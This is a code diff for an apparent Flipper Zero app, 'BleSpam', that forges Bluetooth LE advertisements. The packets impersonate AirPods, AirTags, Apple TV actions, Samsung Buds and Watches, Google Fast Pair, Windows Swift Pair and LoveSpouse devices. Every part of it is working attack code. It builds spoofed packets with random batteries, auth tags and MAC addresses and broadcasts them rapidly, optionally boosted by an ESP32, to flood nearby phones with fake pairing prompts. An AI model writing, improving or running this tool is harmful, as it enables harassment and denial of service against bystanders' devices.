@@ -15,12 +15,12 @@
 
 // --- Device types ---
 typedef enum {
-    TypeApplePair,
-    TypeAppleAction,
-    TypeSamsung,
+    TypeApplePP,    // Continuity ProximityPair
+    TypeAppleNA,    // Continuity NearbyAction
+    TypeSamsungBuds,
     TypeSamsungWatch,
-    TypeAndroid,
-    TypeWindows,
+    TypeFastPair,
+    TypeSwiftPair,
     TypeLovePlay,
     TypeLoveStop,
     TypeRotate,
@@ -29,86 +29,81 @@ typedef enum {
 typedef struct {
     const char* name;
     DevType type;
-    uint8_t data[31];
-    uint8_t len;
+    union {
+        uint16_t pp_model;      // Apple PP: 2-byte model
+        uint8_t na_action;      // Apple NA: action byte
+        uint32_t buds_model;    // Samsung Buds: 3-byte model
+        uint8_t watch_model;    // Samsung Watch: 1-byte model
+    };
 } DevEntry;
 
-// Apple Proximity Pair base: len, type=0xFF, company=0x004C, subtype=0x07, len=0x19, status=0x01
-// Then model (2B), status, battery(3B), lid, color, filler
-#define APPLE_PAIR(n, m0, m1) \
-    {n, TypeApplePair, {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x01, m0, m1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 31}
-
-// Apple Nearby Action base: len, type=0xFF, company=0x004C, subtype=0x0F, len, flags, action_type
-#define APPLE_ACTION(n, flags, act) \
-    {n, TypeAppleAction, {0x10, 0xFF, 0x4C, 0x00, 0x0F, 0x05, flags, act, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 17}
-
-// Samsung EasySetup Buds
-#define SAMSUNG_BUDS(n, d0, d1) \
-    {n, TypeSamsung, {0x15, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, d0, d1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 22}
-
-// Samsung EasySetup Watch
-#define SAMSUNG_WATCH(n, d0, d1) \
-    {n, TypeSamsungWatch, {0x15, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, d0, d1, 0x00, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 22}
+// Apple Proximity Pair models (from Xtreme/Momentum source)
+// Apple Nearby Action types (from furiousMAC/continuity)
+// Samsung EasySetup models (from Spooks4576)
 
 static const DevEntry devs[] = {
-    // Apple Proximity Pair (models from binary)
-    APPLE_PAIR("AirPods",           0x20, 0x02),
-    APPLE_PAIR("AirPods 2",        0x0F, 0x20),
-    APPLE_PAIR("AirPods 3",        0x13, 0x21),
-    APPLE_PAIR("AirPods Pro",      0x0E, 0x20),
-    APPLE_PAIR("AirPods Pro 2",    0x14, 0x20),
-    APPLE_PAIR("AirPods Max",      0x0A, 0x20),
-    APPLE_PAIR("Beats Flex",       0x10, 0x20),
-    APPLE_PAIR("Beats Studio Buds",0x12, 0x20),
-    APPLE_PAIR("Beats Studio Buds+",0x16,0x20),
-    APPLE_PAIR("Beats Solo 3",     0x06, 0x20),
-    APPLE_PAIR("Beats Studio 3",   0x09, 0x20),
-    APPLE_PAIR("Beats Fit Pro",    0x10, 0x21),
-    APPLE_PAIR("Beats X",          0x05, 0x20),
-    APPLE_PAIR("Powerbeats 3",     0x03, 0x20),
-    APPLE_PAIR("Powerbeats Pro",   0x0B, 0x20),
-    APPLE_PAIR("AirTag",           0x05, 0x30),
-    APPLE_PAIR("Hermes AirTag",    0x05, 0x31),
-    APPLE_PAIR("Apple Vision Pro", 0x24, 0x02),
+    // Apple Proximity Pair
+    {"AirPods",             TypeApplePP, .pp_model = 0x0220},
+    {"AirPods 2",           TypeApplePP, .pp_model = 0x0F20},
+    {"AirPods 3",           TypeApplePP, .pp_model = 0x1320},
+    {"AirPods Pro",         TypeApplePP, .pp_model = 0x0E20},
+    {"AirPods Pro 2",       TypeApplePP, .pp_model = 0x1420},
+    {"AirPods Max",         TypeApplePP, .pp_model = 0x0A20},
+    {"Beats Flex",          TypeApplePP, .pp_model = 0x1020},
+    {"Beats Studio Buds",   TypeApplePP, .pp_model = 0x1120},
+    {"Beats Studio Buds+",  TypeApplePP, .pp_model = 0x1620},
+    {"Beats Solo 3",        TypeApplePP, .pp_model = 0x0620},
+    {"Beats Studio 3",      TypeApplePP, .pp_model = 0x0920},
+    {"Beats Fit Pro",       TypeApplePP, .pp_model = 0x1220},
+    {"Beats X",             TypeApplePP, .pp_model = 0x0520},
+    {"Powerbeats 3",        TypeApplePP, .pp_model = 0x0320},
+    {"Powerbeats Pro",      TypeApplePP, .pp_model = 0x0B20},
+    {"AirTag",              TypeApplePP, .pp_model = 0x0055},
+    {"Hermes AirTag",       TypeApplePP, .pp_model = 0x0030},
+    {"Apple Vision Pro",    TypeApplePP, .pp_model = 0x2420},
 
-    // Apple Nearby Actions
-    APPLE_ACTION("AppleTV Pair",        0xC0, 0x04),
-    APPLE_ACTION("Join AppleTV?",       0xBF, 0x06),
-    APPLE_ACTION("HomePod Setup",       0xC0, 0x01),
-    APPLE_ACTION("Transfer Number",     0xC0, 0x05),
-    APPLE_ACTION("AppleTV Connect..",   0xC0, 0x07),
-    APPLE_ACTION("AppleTV ColorBal",    0xC0, 0x08),
-    APPLE_ACTION("AppleID",             0xC0, 0x09),
-    APPLE_ACTION("AppleTV?",            0xC0, 0x02),
-    APPLE_ACTION("Sign In Device",      0xC0, 0x0B),
-    APPLE_ACTION("HomeKit",             0xC0, 0x0D),
-    APPLE_ACTION("AppleTV",             0xC0, 0x0E),
+    // Apple Nearby Action
+    {"Setup AppleTV",       TypeAppleNA, .na_action = 0x01},
+    {"Transfer Number",     TypeAppleNA, .na_action = 0x02},
+    {"Apple Watch",         TypeAppleNA, .na_action = 0x05},
+    {"Pair AppleTV",        TypeAppleNA, .na_action = 0x06},
+    {"Setup iPhone",        TypeAppleNA, .na_action = 0x09},
+    {"HomePod Setup",       TypeAppleNA, .na_action = 0x0B},
+    {"HomeKit AppleTV",     TypeAppleNA, .na_action = 0x0D},
+    {"AppleTV AutoFill",    TypeAppleNA, .na_action = 0x13},
+    {"AppleTV AudioSync",   TypeAppleNA, .na_action = 0x19},
+    {"AppleTV ColorBal",    TypeAppleNA, .na_action = 0x1E},
+    {"Join AppleTV?",       TypeAppleNA, .na_action = 0x20},
+    {"Apple Vision Pro",    TypeAppleNA, .na_action = 0x24},
+    {"AppleTV Connect..",   TypeAppleNA, .na_action = 0x27},
+    {"AppleID AppleTV?",    TypeAppleNA, .na_action = 0x2B},
+    {"Sign In Device",      TypeAppleNA, .na_action = 0x2F},
 
-    // Samsung Buds
-    SAMSUNG_BUDS("Samsung Buds Pro",    0x01, 0xEE),
-    SAMSUNG_BUDS("Samsung Buds 2",      0x01, 0xF0),
-    SAMSUNG_BUDS("Samsung Buds Live",   0x01, 0xEF),
-    SAMSUNG_BUDS("Samsung Buds FE",     0x01, 0xF3),
-    SAMSUNG_BUDS("Samsung Buds2 Purp",  0x01, 0xF5),
+    // Samsung Buds (3-byte model)
+    {"Samsung Buds Pro",    TypeSamsungBuds, .buds_model = 0xEE7A0C},
+    {"Samsung Buds 2",      TypeSamsungBuds, .buds_model = 0xEAAA17},
+    {"Samsung Buds Live",   TypeSamsungBuds, .buds_model = 0x850116},
+    {"Samsung Buds FE",     TypeSamsungBuds, .buds_model = 0x3D8F41},
+    {"Samsung Buds2 Purp",  TypeSamsungBuds, .buds_model = 0x39EA48},
 
-    // Samsung Watch
-    SAMSUNG_WATCH("Samsung Watch4 44",  0x11, 0xA5),
-    SAMSUNG_WATCH("Samsung Watch5 44",  0x11, 0xA7),
-    SAMSUNG_WATCH("Samsung Watch6 40",  0x11, 0xB0),
-    SAMSUNG_WATCH("Samsung Watch Ultra",0x11, 0xAA),
+    // Samsung Watch (1-byte model)
+    {"Samsung Watch4 44",   TypeSamsungWatch, .watch_model = 0x04},
+    {"Samsung Watch5 44",   TypeSamsungWatch, .watch_model = 0x11},
+    {"Samsung Watch6 40",   TypeSamsungWatch, .watch_model = 0x1B},
+    {"Samsung Watch Ultra", TypeSamsungWatch, .watch_model = 0x15},
 
     // Google Fast Pair
-    {"Android Fast Pair", TypeAndroid, {0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 7},
+    {"Android Fast Pair",   TypeFastPair, {0}},
 
     // Windows Swift Pair
-    {"Windows Swift Pair", TypeWindows, {0x07, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8},
+    {"Windows Swift Pair",  TypeSwiftPair, {0}},
 
     // LoveSpouse
-    {"LoveSpouse Play", TypeLovePlay, {0x08, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 9},
-    {"LoveSpouse Stop", TypeLoveStop, {0x08, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 9},
+    {"LoveSpouse Play",     TypeLovePlay, {0}},
+    {"LoveSpouse Stop",     TypeLoveStop, {0}},
 
     // Rotate all
-    {"[ALL] Rotate", TypeRotate, {0}, 0},
+    {"[ALL] Rotate",        TypeRotate, {0}},
 };
 
 #define DEV_COUNT (sizeof(devs) / sizeof(devs[0]))
@@ -129,51 +124,195 @@ typedef struct {
     EspBoost* esp;
 } BleSpamApp;
 
-// --- Packet building ---
-static void build_packet(uint8_t* out, uint8_t* out_len, const DevEntry* dev) {
-    memcpy(out, dev->data, dev->len);
-    *out_len = dev->len;
+// --- Packet building (matches Xtreme/Momentum original) ---
 
+static uint8_t build_apple_pp(uint8_t* pkt, uint16_t model) {
+    uint8_t i = 0;
+    uint8_t prefix;
+    if(model == 0x0055 || model == 0x0030)
+        prefix = 0x05; // AirTag
+    else
+        prefix = 0x01; // Not Your Device
+
+    pkt[i++] = 25 + 5; // Size (continuity_size + header overhead - 1)
+    pkt[i++] = 0xFF;    // AD Type: Manufacturer Specific
+    pkt[i++] = 0x4C;    // Apple company ID
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x07;    // Continuity Type: Proximity Pair
+    pkt[i++] = 0x19;    // Continuity Size (25)
+
+    pkt[i++] = prefix;
+    pkt[i++] = (model >> 8) & 0xFF;  // Device Model high
+    pkt[i++] = (model >> 0) & 0xFF;  // Device Model low
+    pkt[i++] = 0x55;                  // Status
+    pkt[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds battery
+    pkt[i++] = ((rand() % 8) << 4) + (rand() % 10);  // Case battery + charging
+    pkt[i++] = (rand() % 256);        // Lid open counter
+    pkt[i++] = 0x00;                  // Device color
+    pkt[i++] = 0x00;
+    furi_hal_random_fill_buf(&pkt[i], 16); // Encrypted payload
+    i += 16;
+
+    return i; // 31
+}
+
+static uint8_t build_apple_na(uint8_t* pkt, uint8_t action) {
+    uint8_t i = 0;
+    uint8_t flags = 0xC0;
+    if(action == 0x20 && rand() % 2) flags--; // Join AppleTV spam boost
+    if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched Setup New Device
+
+    pkt[i++] = 5 + 5;   // Size
+    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
+    pkt[i++] = 0x4C;     // Apple company ID
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x0F;     // Continuity Type: Nearby Action
+    pkt[i++] = 0x05;     // Continuity Size (5)
+
+    pkt[i++] = flags;    // Action flags
+    pkt[i++] = action;   // Action type
+    furi_hal_random_fill_buf(&pkt[i], 3); // Auth tag
+    i += 3;
+
+    return i; // 11
+}
+
+static uint8_t build_samsung_buds(uint8_t* pkt, uint32_t model) {
+    uint8_t i = 0;
+    pkt[i++] = 27;      // Size
+    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
+    pkt[i++] = 0x75;     // Samsung company ID
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x42;
+    pkt[i++] = 0x09;
+    pkt[i++] = 0x81;
+    pkt[i++] = 0x02;
+    pkt[i++] = 0x14;
+    pkt[i++] = 0x15;
+    pkt[i++] = 0x03;
+    pkt[i++] = 0x21;
+    pkt[i++] = 0x01;
+    pkt[i++] = 0x09;
+    pkt[i++] = (model >> 16) & 0xFF; // Model byte 0
+    pkt[i++] = (model >> 8) & 0xFF;  // Model byte 1
+    pkt[i++] = 0x01;
+    // Pad remaining to size 28
+    while(i < 28) pkt[i++] = 0x00;
+    return 28;
+}
+
+static uint8_t build_samsung_watch(uint8_t* pkt, uint8_t model) {
+    uint8_t i = 0;
+    pkt[i++] = 14;      // Size
+    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
+    pkt[i++] = 0x75;     // Samsung company ID
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x01;
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x02;
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x01;
+    pkt[i++] = 0x01;
+    pkt[i++] = 0xFF;
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x43;
+    pkt[i++] = model;   // Watch model
+    return i; // 15
+}
+
+static uint8_t build_fastpair(uint8_t* pkt) {
+    // Two AD structures like the original
+    uint32_t model = (rand() & 0xFFFFFF); // Random Fast Pair model
+    uint8_t i = 0;
+
+    // AD structure 1: Service UUID List
+    pkt[i++] = 3;       // Size
+    pkt[i++] = 0x03;    // AD Type: Complete List of 16-bit Service UUIDs
+    pkt[i++] = 0x2C;    // Google FastPair UUID
+    pkt[i++] = 0xFE;
+
+    // AD structure 2: Service Data
+    pkt[i++] = 6;       // Size
+    pkt[i++] = 0x16;    // AD Type: Service Data
+    pkt[i++] = 0x2C;    // Google FastPair UUID
+    pkt[i++] = 0xFE;
+    pkt[i++] = (model >> 16) & 0xFF;
+    pkt[i++] = (model >> 8) & 0xFF;
+    pkt[i++] = (model >> 0) & 0xFF;
+
+    // AD structure 3: TX Power Level
+    pkt[i++] = 2;
+    pkt[i++] = 0x0A;    // AD Type: TX Power
+    pkt[i++] = 0x00;    // 0 dBm
+
+    return i; // 14
+}
+
+static uint8_t build_swiftpair(uint8_t* pkt) {
+    const char* name = "Flipper Z";
+    uint8_t name_len = strlen(name);
+    uint8_t size = 7 + name_len;
+    uint8_t i = 0;
+
+    pkt[i++] = size - 1;
+    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
+    pkt[i++] = 0x06;     // Microsoft company ID
+    pkt[i++] = 0x00;
+    pkt[i++] = 0x03;     // Microsoft Beacon ID
+    pkt[i++] = 0x00;     // Beacon Sub Scenario
+    pkt[i++] = 0x80;     // Reserved RSSI
+    memcpy(&pkt[i], name, name_len);
+    i += name_len;
+
+    return i;
+}
+
+static uint8_t build_packet(uint8_t* pkt, const DevEntry* dev) {
     switch(dev->type) {
-    case TypeApplePair:
-        // Randomize battery bytes (rand()%16 for Beats compatibility)
-        out[9] = (rand() % 16) | 0x40;   // right
-        out[10] = (rand() % 16) | 0x40;  // left
-        out[11] = (rand() % 16) | 0x40;  // case
-        break;
-    case TypeAppleAction:
-        // Auth tag random fill
-        out[7] = rand() & 0xFF;
-        out[8] = rand() & 0xFF;
-        out[9] = rand() & 0xFF;
-        break;
-    case TypeAndroid: {
-        // Random model ID from Fast Pair DB
-        uint32_t model = rand() & 0xFFFFFF;
-        out[3] = (model >> 16) & 0xFF;
-        out[4] = (model >> 8) & 0xFF;
-        out[5] = model & 0xFF;
-        break;
+    case TypeApplePP:
+        return build_apple_pp(pkt, dev->pp_model);
+    case TypeAppleNA:
+        return build_apple_na(pkt, dev->na_action);
+    case TypeSamsungBuds:
+        return build_samsung_buds(pkt, dev->buds_model);
+    case TypeSamsungWatch:
+        return build_samsung_watch(pkt, dev->watch_model);
+    case TypeFastPair:
+        return build_fastpair(pkt);
+    case TypeSwiftPair:
+        return build_swiftpair(pkt);
+    case TypeLovePlay:
+    case TypeLoveStop: {
+        uint8_t i = 0;
+        pkt[i++] = 0x08;
+        pkt[i++] = 0xFF;
+        pkt[i++] = 0x00;
+        pkt[i++] = 0x00;
+        pkt[i++] = 0x00;
+        pkt[i++] = 0x00;
+        pkt[i++] = 0x00;
+        pkt[i++] = 0x00;
+        pkt[i++] = 0x00;
+        return i;
     }
     default:
-        break;
+        return 0;
     }
 }
 
 static EspBoostCmd dev_type_to_esp_cmd(DevType type) {
     switch(type) {
-    case TypeApplePair:
-    case TypeAppleAction:
+    case TypeApplePP:
+    case TypeAppleNA:
         return EspBoostCmdApple;
-    case TypeSamsung:
+    case TypeSamsungBuds:
     case TypeSamsungWatch:
         return EspBoostCmdSamsung;
-    case TypeAndroid:
+    case TypeFastPair:
         return EspBoostCmdGoogle;
-    case TypeWindows:
+    case TypeSwiftPair:
         return EspBoostCmdWindows;
-    case TypeRotate:
-        return EspBoostCmdRandom;
     default:
         return EspBoostCmdRandom;
     }
@@ -182,34 +321,36 @@ static EspBoostCmd dev_type_to_esp_cmd(DevType type) {
 // --- BLE worker thread ---
 static int32_t worker_fn(void* ctx) {
     BleSpamApp* app = ctx;
-    GapExtraBeaconConfig config = {
-        .adv_channel_map = GapAdvChannelMap37 | GapAdvChannelMap38 | GapAdvChannelMap39,
-        .adv_power_level = GapAdvPowerLevel_0dBm,
-        .min_adv_interval_ms = 50,
-        .max_adv_interval_ms = 150,
-        .address_type = GapAddressTypeRandom,
-    };
+
+    GapExtraBeaconConfig config;
+    memset(&config, 0, sizeof(config));
+    config.adv_channel_map = GapAdvChannelMapAll;
+    config.adv_power_level = GapAdvPowerLevel_6dBm;
+    config.address_type = GapAddressTypeRandom;
 
     int rotate_idx = 0;
 
     while(app->running) {
         int idx = app->sel;
-        // Rotate mode
         if(devs[idx].type == TypeRotate) {
             idx = rotate_idx;
-            rotate_idx = (rotate_idx + 1) % (DEV_COUNT - 1); // skip last entry (Rotate itself)
+            rotate_idx = (rotate_idx + 1) % ((int)DEV_COUNT - 1);
         }
 
         const DevEntry* dev = &devs[idx];
         uint8_t pkt[31];
-        uint8_t pkt_len = 0;
-        build_packet(pkt, &pkt_len, dev);
+        uint8_t pkt_len = build_packet(pkt, dev);
+        if(pkt_len == 0) {
+            furi_delay_ms(100);
+            continue;
+        }
 
-        // Random MAC with top 2 bits = 0xC0 (random address)
-        uint8_t mac[6];
-        furi_hal_random_fill_buf(mac, 6);
-        mac[5] = (mac[5] & 0x3F) | 0xC0;
-        memcpy(config.address, mac, 6);
+        // Random MAC
+        furi_hal_random_fill_buf(config.address, 6);
+        config.address[5] = (config.address[5] & 0x3F) | 0xC0;
+
+        config.min_adv_interval_ms = 50;
+        config.max_adv_interval_ms = 75;
 
         furi_hal_bt_extra_beacon_stop();
         bool ok = furi_hal_bt_extra_beacon_set_config(&config);
@@ -241,13 +382,10 @@ static int32_t worker_fn(void* ctx) {
 // --- Start / Stop ---
 static void do_start(BleSpamApp* app) {
     if(app->running) return;
-
     furi_hal_bt_stop_advertising();
-
     app->running = true;
     furi_thread_start(app->worker);
 
-    // ESP32 boost: start parallel broadcast
     if(app->esp) {
         EspBoostCmd cmd = dev_type_to_esp_cmd(devs[app->sel].type);
         esp_boost_start(app->esp, cmd);
@@ -268,7 +406,6 @@ static void do_stop(BleSpamApp* app) {
     furi_hal_bt_extra_beacon_stop();
     furi_hal_bt_start_advertising();
 
-    // ESP32 boost: stop
     if(app->esp) {
         esp_boost_stop(app->esp);
     }
@@ -290,20 +427,16 @@ static void draw_cb(Canvas* canvas, void* model) {
     canvas_clear(canvas);
     canvas_set_font(canvas, FontPrimary);
 
-    // Title
     const char* title = m->esp_connected ? "BleSpam+ESP" : "BleSpam";
     canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, title);
 
-    // Device name
     canvas_set_font(canvas, FontSecondary);
     canvas_draw_str_aligned(canvas, 64, 16, AlignCenter, AlignTop, devs[m->sel].name);
 
-    // Index
     char buf[32];
     snprintf(buf, sizeof(buf), "%d / %d", m->sel + 1, (int)DEV_COUNT);
     canvas_draw_str_aligned(canvas, 64, 28, AlignCenter, AlignTop, buf);
 
-    // Status
     canvas_set_font(canvas, FontPrimary);
     if(m->broadcasting) {
         canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignTop, "Broadcasting");
@@ -314,14 +447,9 @@ static void draw_cb(Canvas* canvas, void* model) {
         canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignTop, "Stopped");
     }
 
-    // Buttons
     elements_button_left(canvas, "< Prev");
     elements_button_right(canvas, "Next >");
-    if(m->broadcasting) {
-        elements_button_center(canvas, "STOP");
-    } else {
-        elements_button_center(canvas, "START");
-    }
+    elements_button_center(canvas, m->broadcasting ? "STOP" : "START");
 }
 
 // --- Input callback ---
@@ -330,31 +458,30 @@ static bool input_cb(InputEvent* event, void* ctx) {
     if(event->type != InputTypeShort && event->type != InputTypeLong) return false;
 
     if(event->key == InputKeyOk) {
-        if(app->running) {
+        if(app->running)
             do_stop(app);
-        } else {
+        else
             do_start(app);
-        }
         return true;
     }
 
     if(event->key == InputKeyLeft) {
-        bool was_running = app->running;
-        if(was_running) do_stop(app);
+        bool was = app->running;
+        if(was) do_stop(app);
         app->sel = (app->sel - 1 + (int)DEV_COUNT) % (int)DEV_COUNT;
         with_view_model(
             app->view, BleSpamModel * m, { m->sel = app->sel; }, true);
-        if(was_running) do_start(app);
+        if(was) do_start(app);
         return true;
     }
 
     if(event->key == InputKeyRight) {
-        bool was_running = app->running;
-        if(was_running) do_stop(app);
+        bool was = app->running;
+        if(was) do_stop(app);
         app->sel = (app->sel + 1) % (int)DEV_COUNT;
         with_view_model(
             app->view, BleSpamModel * m, { m->sel = app->sel; }, true);
-        if(was_running) do_start(app);
+        if(was) do_start(app);
         return true;
     }
 
@@ -374,7 +501,7 @@ int32_t x_ble_spam_main(void* p) {
     BleSpamApp* app = malloc(sizeof(BleSpamApp));
     memset(app, 0, sizeof(BleSpamApp));
 
-    // ESP32 boost init (NULL = not connected, app works fine without it)
+    // ESP32 boost init (NULL = not connected or UART busy, app works fine without it)
     app->esp = esp_boost_init();
 
     app->vd = view_dispatcher_alloc();
@@ -403,13 +530,12 @@ int32_t x_ble_spam_main(void* p) {
 
     app->worker = furi_thread_alloc();
     furi_thread_set_name(app->worker, "BleSpam");
-    furi_thread_set_stack_size(app->worker, 1024);
+    furi_thread_set_stack_size(app->worker, 2048);
     furi_thread_set_callback(app->worker, worker_fn);
     furi_thread_set_context(app->worker, app);
 
     view_dispatcher_run(app->vd);
 
-    // Cleanup
     if(app->running) do_stop(app);
 
     furi_thread_free(app->worker);
